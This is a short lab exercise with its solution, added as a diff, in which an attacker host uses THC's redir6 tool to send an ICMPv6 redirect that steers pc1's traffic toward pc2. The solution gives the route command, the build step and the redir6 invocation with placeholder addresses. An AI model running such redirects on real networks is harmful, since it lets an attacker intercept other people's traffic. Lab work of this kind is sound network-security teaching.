@@ -1,0 +1,14 @@
+The adversary wants to attract the traffic of pc1 towards
+pc2. Then, it uses the ICMP redirect to perform it.
+
+You have to use a1 to change the routing decision of pc1 when
+moving to pc2. You have to use the redir6 tool. a1 is NOT
+configured.
+
+All the needed dependencies are in the cache, you only have to
+compile the thc-toolkit (make).
+
+Solution:
+> Run in pc2 a command "ip -6 r add <global-pc2> via fe80::1 dev eth0" // to add routing table entry
+> In a1 run "make" inside THC folder to compile thc 
+> Run "redir6 eth0 <local-pc1> <global-pc2> fe80::1 <attacker-local>"
